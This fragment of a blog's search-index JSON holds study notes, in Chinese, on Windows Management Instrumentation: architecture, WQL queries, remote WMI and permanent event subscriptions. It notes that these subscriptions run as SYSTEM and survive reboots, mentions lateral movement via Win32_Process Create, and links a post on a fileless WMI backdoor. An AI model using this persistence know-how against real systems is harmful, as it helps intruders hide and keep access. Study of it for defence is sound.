\u6709\u5982\u4e0b\u6807\u51c6\u7c7b,\u6240\u6709\u7684\u4e8b\u4ef6\u5904\u7406\u7c7b\u90fd\u5728\u4ece __EventConsumer \u7c7b\u7ee7\u627f\u800c\u6765\u7684 LogFileEventConsumer\uff1a \u5c06\u4e8b\u4ef6\u6570\u636e\u5199\u5165\u5230\u6307\u5b9a\u7684\u65e5\u5fd7\u6587\u4ef6 ActiveScriptEventConsumer\uff1a \u7528\u6765\u6267\u884cVBScript/JScript\u7a0b\u5e8f NTEventLogEventConsumer\uff1a\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u4e8b\u4ef6\u6570\u636e\u7684\u65e5\u5fd7\u5165\u53e3\u70b9 SMTPEventConsumer\uff1a\u5c06\u4e8b\u4ef6\u6570\u636e\u7528\u90ae\u4ef6\u53d1\u9001 CommandLineEventConsumer\uff1a\u6267\u884c\u4e00\u6761\u547d\u4ee4 reference\uff1a https://m0nst3r.me/pentest/%E5%88%A9%E7%94%A8WMI%E6%9E%84%E5%BB%BA%E4%B8%80%E4%B8%AA%E6%8C%81%E4%B9%85%E5%8C%96%E7%9A%84%E5%BC%82%E6%AD%A5%E7%9A%84%E6%97%A0%E6%96%87%E4%BB%B6%E5%90%8E%E9%97%A8.html","title":"WMI\u7c97\u7565\u5b66\u4e60"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#wmi","text":"","title":"WMI\u7c97\u7565\u5b66\u4e60"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#_1","text":"WMI \u67b6\u6784 Managed Components\uff08\u7ba1\u7406\u7ec4\u4ef6\uff09 Consuming Data\uff08\u6570\u636e\u5904\u7406\uff09 Querying Data\uff08\u6570\u636e\u67e5\u8be2\uff09 Populating Data\uff08\u6570\u636e\u586b\u5145\uff09 Structuring Data\uff08\u6784\u9020\u6570\u636e\uff09 Transmitting Data\uff08\u6570\u636e\u4f20\u8f93\uff09 Performing Actions\uff08\u6267\u884c\u64cd\u4f5c\uff09 WMI\u7c7b\u548c\u547d\u540d\u7a7a\u95f4 WQL Instance Queries\uff08\u5b9e\u4f8b\u67e5\u8be2\uff09 Event Queries\uff08\u4e8b\u4ef6\u67e5\u8be2\uff09 Meta Queries\uff08\u5143\u67e5\u8be2\uff09 \u8fdc\u7a0bWMI DCOM WINRM WMI\u4e8b\u4ef6 Event FIlters \u4e8b\u4ef6\u8fc7\u6ee4\u5668 Intrinsic Events Extrinsic Events Event Consumer \u4e8b\u4ef6\u5904\u7406 WMI\uff0cWindows Management Instrumentation\uff0cWindows\u7ba1\u7406\u5de5\u5177\u3002\u5982\u4eca\u6240\u6709\u5f97windows\u90fd\u9884\u88c5\u4e86\u8fd9\u4e2a\u5f3a\u5927\u7684\u547d\u4ee4\u884c\u7ba1\u7406\u5de5\u5177\uff0c\u540c\u65f6\u5b83\u5f3a\u5927\u7684\u529f\u80fd\u4e5f\u4e3a\u9ed1\u5ba2\u63d0\u4f9b\u4e86\u4e00\u4e2a\u7edd\u4f73\u7684\u653b\u51fb\u9762\u3002","title":"\u76ee\u5f55"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#wmi_1","text":"WMI\u7684\u67b6\u6784\u5982\u4e0b\u56fe\u6240\u793a \u53ef\u4ee5\u603b\u7ed3\u4e3a\u4ee5\u4e0b\u90e8\u5206","title":"WMI \u67b6\u6784"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#managed-components","text":"\u5c31\u662fWMI\u5bf9\u8c61\uff0c\u662f\u7ed3\u6784\u5316 \u7684 \u64cd\u4f5c\u7cfb\u7edf\u6570\u636e \u7684 \u7c7b\u5b9e\u4f8b\u3002 \u5fae\u8f6f\u63d0\u4f9b\u4e86\u8bb8\u591a\u7684WMI\u5bf9\u8c61\u6765\u63d0\u4f9b\u7cfb\u7edf\u76f8\u5173\u4fe1\u606f\uff0c\u5982 Win32_Process \uff0c Win32_Service \uff0c AntiVirusProduct \uff0c Win32_StartupCommand \u7b49\u3002","title":"Managed Components\uff08\u7ba1\u7406\u7ec4\u4ef6\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#consuming-data","text":"\u7528\u4e8e\u5904\u7406WMI\u6570\u636e\u548c\u6267\u884cWMI\u547d\u4ee4\u3002\u5982powershell\u4e0b\u7684WMI\u7684\u4ea4\u4e92\u6a21\u5f0f\u3002","title":"Consuming Data\uff08\u6570\u636e\u5904\u7406\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#querying-data","text":"\u901a\u8fc7\u4e00\u4e2a\u53eb\u505aWQL\u7684\u8bed\u8a00\u8fdb\u884c\u67e5\u8be2\uff0c\u5b83\u548cSQL\u7684\u8bed\u6cd5\u5341\u5206\u76f8\u4f3c\u3002","title":"Querying Data\uff08\u6570\u636e\u67e5\u8be2\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#populating-data","text":"\u5f53\u6211\u4eec\u8bf7\u6c42\u4e00\u4e2aWMI\u5bf9\u8c61\u65f6\uff0cWMI\u5728\u80cc\u540e\u4f1a\u901a\u8fc7\u5404\u79cd\u624b\u6bb5\uff08\u6bd4\u5982\u67e5\u8be2\u6240\u6709\u8fdb\u7a0b\uff0c\u679a\u4e3e\u6ce8\u518c\u8868\u952e\uff09\u53bb\u586b\u5145\u8fd9\u4e2aWMI\u5bf9\u8c61\u4ee5\u4f7f\u5176\u80fd\u591f\u5448\u73b0\u5728\u6211\u4eec\u9762\u524d\u3002 WMI\u5728\u586b\u5145\u4e00\u4e2aWMI\u5bf9\u8c61\u65f6\uff0c\u4f1a\u6709\u4e24\u79cd\u7c7b\u5b9e\u4f8b\u3002Dynamic Object\u52a8\u6001\u5bf9\u8c61\u548cPersistent Object \u6c38\u4e45\u5316\u5bf9\u8c61\u3002 \u52a8\u6001\u5bf9\u8c61\u662f\u8fdb\u884c\u67e5\u8be2\u7684\u65f6\u5019\u751f\u6210\u7684\uff0c\u4f8b\u5982Win32_Process\u5c31\u662f\u4e00\u4e2a\u52a8\u6001\u5bf9\u8c61\u3002 \u6c38\u4e45\u5316\u5bf9\u8c61\u662f\u5b58\u50a8\u5728CIM\u5e93\u4e2d\u7684\uff0c\u9ed8\u8ba4\u5b58\u653e\u5728%SystemRoot%\\System32\\wbem\\Repository\\OBJECTS.DATA","title":"Populating Data\uff08\u6570\u636e\u586b\u5145\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#structuring-data","text":"WMI\u5bf9\u8c61\u5927\u90e8\u5206\u7ed3\u6784\u662f\u901a\u8fc7MOF\u6587\u4ef6\u63cf\u8ff0\u7684\uff0cMOF\u6587\u4ef6\u4f7f\u7528\u7c7b\u4f3cC++\u7684\u8bed\u6cd5\u6765\u63cf\u8ff0WMI\u5bf9\u8c61\u3002 \u540c\u65f6WMI\u4e5f\u53ef\u4ee5\u901a\u8fc7\u5728CIM\u5e93\u4e2d\u63d2\u5165.net\u4ee3\u7801\u5b9a\u4e49\u3002","title":"Structuring Data\uff08\u6784\u9020\u6570\u636e\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#transmitting-data","text":"Microsoft\u63d0\u4f9b\u4e86\u4e24\u79cd\u7528\u4e8e\u8fdc\u7a0b\u4f20\u8f93WMI\u6570\u636e\u7684\u65b9\u6cd5\uff1a DCOM \u548c Windows Remote Management (WinRM) \u3002","title":"Transmitting Data\uff08\u6570\u636e\u4f20\u8f93\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#performing-actions","text":"\u4e00\u4e9bWMI\u5bf9\u8c61\u5305\u542b\u4e00\u4e9b\u53ef\u6267\u884c\u7684\u65b9\u6cd5/\u51fd\u6570\u3002\u4f8b\u5982\uff0cWin32_Process\u7c7b\u7684\u9759\u6001\u51fd\u6570 Create \u5c31\u7ecf\u5e38\u88ab\u9ed1\u5ba2\u7528\u6765\u505a\u5185\u7f51\u4e2d\u7684\u6a2a\u5411\u79fb\u52a8\u3002 WMI\u8fd8\u63d0\u4f9b\u4e86\u4e00\u4e2a Eventing System \uff08\u4e8b\u4ef6\u7cfb\u7edf\uff09\uff0c\u7528\u6237\u53ef\u4ee5\u6ce8\u518c\u5728WMI\u5bf9\u8c61\u751f\u6210\uff0c\u4fee\u6539\u6216\u5220\u9664\u65f6\u6267\u884c\u7684\u4e8b\u4ef6\u5904\u7406\u7a0b\u5e8f\u3002","title":"Performing Actions\uff08\u6267\u884c\u64cd\u4f5c\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#wmi_2","text":"\u4e00\u4e2aWMI\u5bf9\u8c61\u5c31\u662f\u4e00\u4e2aWMI\u7c7b\u7684\u5b9e\u73b0\u3002 WMI\u7c7b\u88ab\u5206\u7c7b\u5206\u5c42\u653e\u5728\u547d\u540d\u7a7a\u95f4\u4e2d\uff0c\u6240\u6709\u547d\u540d\u7a7a\u95f4\u90fd\u653e\u5728ROOT\u547d\u4ee4\u7a7a\u95f4\u4e0b\uff0c\u5f53\u4e0d\u6307\u5b9a\u547d\u540d\u7a7a\u95f4\u8fdb\u884c\u67e5\u8be2\u65f6\uff0c\u4f1a\u9ed8\u8ba4\u4f7f\u7528root\\cimv2\u4f5c\u4e3a\u547d\u540d\u7a7a\u95f4\u3002 \u6240\u6709\u7684WMI\u8bbe\u7f6e\uff0c\u5305\u62ec\u9ed8\u8ba4\u547d\u540d\u7a7a\u95f4\u5728\u4e0b\u9762\u7684\u6ce8\u518c\u8868\u952e\u4e2d\uff1a HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\WBEM","title":"WMI\u7c7b\u548c\u547d\u540d\u7a7a\u95f4"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#wql","text":"wmi\u63d0\u4f9b\u4e86\u4e00\u79cd\u975e\u5e38\u76f4\u89c2\u7684\u8bed\u6cd5\u6765\u67e5\u8be2WMI\u5bf9\u8c61\u5b9e\u4f8b\uff0c\u7c7b\u548c\u547d\u540d\u7a7a\u95f4\uff0c\u5373WQL\u3002\u5b83\u5f88\u50cfSQL\uff0c\u4f46\u5b83\u53ea\u80fd\u7528\u4e8e\u67e5\u8be2\u3002 WQL\u67e5\u8be2\u5927\u81f4\u5206\u4e3a\u5982\u4e0b\u7c7b\uff1a","title":"WQL"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#instance-queries","text":"\u67e5\u8be2WMI\u5bf9\u8c61\u5b9e\u4f8b\u3002 SELECT [Class property name | *] FROM [CLASS NAME] <WHERE [CONSTRAINT]>","title":"Instance Queries\uff08\u5b9e\u4f8b\u67e5\u8be2\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#event-queries","text":"\u7b49\u540c\u4e8e\u5728WMI\u5bf9\u8c61\u521b\u5efa/\u4fee\u6539/\u5220\u9664\u7684\u65f6\u5019\u6ce8\u518c\u4e00\u4e2a\u6d88\u606f\u3002\u5e38\u7528\u4e8e\u76d1\u542c\u67d0\u4e8b\u4ef6\u89e6\u53d1\uff0c\u6839\u636e\u76d1\u542c\u7684\u6d88\u606f\u7c7b\u578b\u662fintrinsic\uff08\u7cfb\u7edf\u81ea\u5e26\u7684\uff09\u8fd8\u662fextrinsic\uff08\u7b2c\u4e09\u65b9\u7684\uff09\uff0c\u67e5\u8be2\u8bed\u53e5\u683c\u5f0f\u4e5f\u4e0d\u540c\u3002WITHIN\u7684\u610f\u601d\u662f\u67e5\u8be2\u95f4\u9694\uff0c\u5b83\u4f1a\u6839\u636e\u8bbe\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u53bb\u67e5\u770b\u4e8b\u4ef6\u662f\u5426\u5904\u4e8e\u88ab\u89e6\u53d1\u72b6\u6001\u3002 SELECT [Class property name | *] FROM [INTRINSIC CLASS NAME] WITHIN [POLLING INTERVAL] <WHERE [CONSTRAINT]> SELECT [Class property name | *] FROM [EXTRINSIC CLASS NAME] <WHERE [CONSTRAINT]> \u4e0b\u9762\u7684\u67e5\u8be2\u5c06\u5728\u7528\u6237\u767b\u5f55\u7684\u65f6\u5019\u88ab\u6267\u884c\uff1a SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstanceISA 'Win32_LogonSession' AND TargetInstance.LogonType=2 \u4e0b\u9762\u7684\u67e5\u8be2\u5c06\u5728\u7528\u6237\u63d2\u5165\u53ef\u79fb\u9664\u8bbe\u5907\u65f6\u88ab\u6267\u884c\uff1a SELECT * FROM Win32_VolumeChangeEvent Where EventType=2","title":"Event Queries\uff08\u4e8b\u4ef6\u67e5\u8be2\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#meta-queries","text":"\u5143\u67e5\u8be2\u7528\u6765\u83b7\u53d6WMI\u547d\u540d\u7a7a\u95f4\u548c\u7c7b\u7ed3\u6784\u7684\u5143\u4fe1\u606f\u3002\u6700\u5e38\u89c1\u7684\u7528\u6cd5\u662f\u7528\u6765\u5217\u4e3eWMI\u547d\u540d\u7a7a\u95f4\u7684\u7c7b\u7ed3\u6784,\u5143\u67e5\u8be2\u662f\u5b9e\u4f8b\u67e5\u8be2\u7684\u4e00\u4e2a\u5b50\u96c6 SELECT [Class property name | *] FROM [Meta_Class | SYSTEM CLASS NAME] <WHERE [CONSTRAINT]> \u67e5\u8be2\u67d0\u9ed8\u8ba4\u547d\u540d\u7a7a\u95f4root\\cimv2\u4e0b\u7684\u6240\u6709\u547d\u540d\u7a7a\u95f4 SELECT Name FROM __NAMESPACE","title":"Meta Queries\uff08\u5143\u67e5\u8be2\uff09"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#wmi_3","text":"WMI\u8fd8\u6709\u4e00\u4e2a\u5341\u5206\u5f3a\u5927\u7684\u4f53\u73b0\uff0c\u8fdc\u7a0b\u64cd\u4f5c\u3002 WMI\u8fdc\u7a0b\u64cd\u4f5c\u65f6\u652f\u6301\u4e24\u79cd\u534f\u8baeDCOM\u548cWINRM\u3002","title":"\u8fdc\u7a0bWMI"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#dcom","text":"DCOM\u662fWMI\u7684\u9ed8\u8ba4\u534f\u8bae\uff0c\u901a\u8fc7135\u7aef\u53e3\u5efa\u7acbTCP\u94fe\u63a5\uff0c\u968f\u540e\u6570\u636e\u4ea4\u6362\u5219\u662f\u968f\u673a\u9009\u62e9TCP\u7aef\u53e3\u4f20\u8f93\u3002 \u6240\u6709powershell\u4e2d\u5185\u7f6e\u7684WMI\u547d\u4ee4\u90fd\u662f\u7528\u7684DCOM\u534f\u8bae","title":"DCOM"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#winrm","text":"WINRM\u5728\u529f\u80fd\u6027\u4e0a\u5df2\u7ecf\u8d85\u8fc7\u4e86DCOM\uff0c\u88ab\u5fae\u8f6f\u4f5c\u4e3a\u5efa\u8bae\u4f7f\u7528\u7684\u534f\u8bae\u3002 \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cWinRM\u670d\u52a1\u5f00\u542f\u5e76\u76d1\u542c 5985/tcp \u7aef\u53e3\uff0c\u800c\u4e14\u9ed8\u8ba4\u662f\u52a0\u5bc6\u7684\u3002\u8fd8\u53ef\u4ee5\u901a\u8fc7\u914d\u7f6e\u8bc1\u4e66\u7684\u65b9\u5f0f\u5728 5986/tcp \u7aef\u53e3\u5b9e\u73b0 HTTPS \u652f\u6301\u3002","title":"WINRM"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#wmi_4","text":"WMI\u4e8b\u4ef6\u53ef\u4ee5\u7528\u6765\u54cd\u5e94\u57fa\u672c\u6240\u6709\u7684\u64cd\u4f5c\u7cfb\u7edf\u4e8b\u4ef6\u3002 WMI\u4e8b\u4ef6\u5206\u4e3a\u4e24\u7c7b\uff0c\u672c\u5730\u5355\u4e2a\u8fdb\u7a0b\u4e8b\u4ef6\u548c\u6c38\u4e45\u6027WMI\u4e8b\u4ef6\u8ba2\u9605\u3002 \u672c\u5730\u4e8b\u4ef6\u7684\u751f\u547d\u5468\u671f\u4e3a\u5bbf\u4e3b\u8fdb\u7a0b\u7684\u5468\u671f\uff0c\u6c38\u4e45\u6027WMI\u4e8b\u4ef6\u5b58\u50a8\u5728WMI\u5e93\u4e2d\u4ee5SYSTEM\u6743\u9650\u8fd0\u884c\uff0c\u5e76\u4e14\u91cd\u542f\u540e\u4f9d\u65e7\u5b58\u5728\u3002 \u5982\u679c\u8981\u5b89\u88c5\u4e00\u4e2a\u6c38\u4e45\u6027WMI\u4e8b\u4ef6\u8ba2\u9605\uff0c\u9700\u6ee1\u8db3\u4ee5\u4e0b\u6761\u4ef6\u3002 \u4e00\u4e2a\u4e8b\u4ef6\u8fc7\u6ee4\u5668 \u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\uff1a\u4ee3\u8868\u4e00\u4e2a\u4e8b\u4ef6\u89e6\u53d1\u65f6\u542f\u52a8\u7684\u52a8\u4f5c \u4e00\u4e2a\u5904\u7406\u7ed1\u5b9a\u7684\u8fc7\u6ee4\u5668\uff1a\u4ee3\u8868\u5c06\u4e00\u4e2a\u8fc7\u6ee4\u5668\u7ed1\u5b9a\u5230\u4e00\u4e2a\u4e8b\u4ef6\u5904\u7406\u7684\u6ce8\u518c\u673a\u5236","title":"WMI\u4e8b\u4ef6"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#event-filters","text":"\u4e00\u4e2a\u4e8b\u4ef6\u8fc7\u6ee4\u5668\u63a5\u6536\u4e00\u4e2aWMI\u4e8b\u4ef6\u67e5\u8be2\u53c2\u6570\uff0c\u5e76\u4fdd\u5b58\u5230 ROOT\\subscription:__EventFilter \u5bf9\u8c61\u7684\u4e00\u4e2a\u5b9e\u4f8b\u4e2d\u3002 \u4e8b\u4ef6\u8fc7\u6ee4\u5668\u4e00\u822c\u6709\u4e24\u7c7b:Intrinsic Events\u548cExtrinsic Events","title":"Event FIlters \u4e8b\u4ef6\u8fc7\u6ee4\u5668"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#intrinsic-events","text":"__NamespaceOperationEvent __NamespaceModificationEvent __NamespaceDeletionEvent __NamespaceCreationEvent __ClassOperationEvent __ClassDeletionEvent __ClassModificationEvent __ClassCreationEvent __InstanceOperationEvent __InstanceCreationEvent __MethodIvocationEvent __InstanceModificationEvent __InstanceDeletionEvent __TimerEvent \u5927\u6982\u6709\u5982\u4e0a\u4e8b\u4ef6\uff0c\u5f88\u5168\u9762\u3002 SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession' AND TargetInstance.LogonType=2 \u4e0a\u9762\u7684\u67e5\u8be2\u7684\u610f\u601d\u662f\uff0c\u5728\u4e00\u4e2a\u767b\u9646\u7c7b\u578b\u4e3a2\uff08\u4ea4\u4e92\u5f0f\u767b\u9646\uff09\u7684Win32_LogonSession\u7c7b\u7684\u5b9e\u4f8b\u521b\u5efa\u65f6\uff0c\u89e6\u53d1\u4e00\u4e2a\u4e8b\u4ef6\u3002 \u5b83\u6709\u4e00\u4e2a\u65f6\u95f4\u95f4\u9694\uff0c\u7528WITHIN\u8bbe\u5b9a\uff0c\u4ed6\u4f1a\u6839\u636e\u8bbe\u5b9a\u7684\u65f6\u95f4\uff0c\u6bcf\u9694\u4e00\u6bb5\u8fd9\u4e2a\u65f6\u95f4\u53bb\u68c0\u67e5\u4e00\u4e0b\u4e8b\u4ef6\u7684\u89e6\u53d1\u60c5\u51b5\u3002 \u6240\u4ee5Intrinsic events\u6709\u65f6\u5019\u5e76\u4e0d\u80fd\u6355\u6349\u5230\u4e8b\u4ef6\uff1a\u5f53\u4e8b\u4ef6\u5728\u8bbe\u5b9a\u7684\u65f6\u95f4\u95f4\u9694\u91cc\u53d1\u751f\u53c8\u6d88\u5931\u3002","title":"Intrinsic Events"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#extrinsic-events","text":"Extrinsic Events \u89e3\u51b3\u4e86\u65f6\u95f4\u54cd\u5e94\u95ee\u9898\uff0c\u5f53\u4e8b\u4ef6\u53d1\u751f\u65f6\u4fbf\u4f1a\u7acb\u523b\u89e6\u53d1\u3002 \u4f46\u5b83\u7684\u4e8b\u4ef6\u7c7b\u4e0d\u591a ROOT\\CIMV2:Win32_ComputerShutdownEvent ROOT\\CIMV2:Win32_ProcessStartTrace ROOT\\CIMV2:Win32_ModuleLoadTrace ROOT\\CIMV2:Win32_ThreadStartTrace ROOT\\CIMV2:Win32_VolumnChangeEvent ROOT\\DEFAULT:Msft_WmiProvider* ROOT\\DEFAULT:RegistryKeyChangeEvent ROOT\\DEFAULT:RegistryValueChangeEvent","title":"Extrinsic Events"},{"location":"%E5%AE%89%E5%85%A8%E8%A7%86%E8%A7%92%E7%9A%84%E5%8E%9F%E7%90%86/windows/%E5%AD%A6%E7%94%9F%E6%97%B6%E4%BB%A3%E5%AD%A6%E7%9A%84windows/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/WMI%E7%B2%97%E7%95%A5%E5%AD%A6%E4%B9%A0/#event-consumer","text":"\u4e00\u4e2aEvent Consumer\u4ee3\u8868\u5f53\u4e00\u4e2a\u4e8b\u4ef6\u89e6\u53d1\u65f6\u8fdb\u884c\u7684\u64cd\u4f5c\u3002 \u6709\u5982\u4e0b\u6807\u51c6\u7c7b,\u6240\u6709\u7684\u4e8b\u4ef6\u5904\u7406\u7c7b\u90fd\u5728\u4ece __EventConsumer \u7c7b\u7ee7\u627f\u800c\u6765\u7684 LogFileEventConsumer\uff1a \u5c06\u4e8b\u4ef6\u6570\u636e\u5199\u5165\u5230\u6307\u5b9a\u7684\u65e5\u5fd7\u6587\u4ef6 ActiveScriptEventConsumer\uff1a \u7528\u6765\u6267\u884cVBScript/JScript\u7a0b\u5e8f NTEventLogEventConsumer\uff1a\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u4e8b\u4ef6\u6570\u636e\u7684\u65e5\u5fd7\u5165\u53e3\u70b9 SMTPEventConsumer\uff1a\u5c06\u4e8b\u4ef6\u6570\u636e\u7528\u90ae\u4ef6\u53d1\u9001 CommandLineEventConsumer\uff1a\u6267\u884c\u4e00\u6761\u547d\u4ee4 reference\uff1a 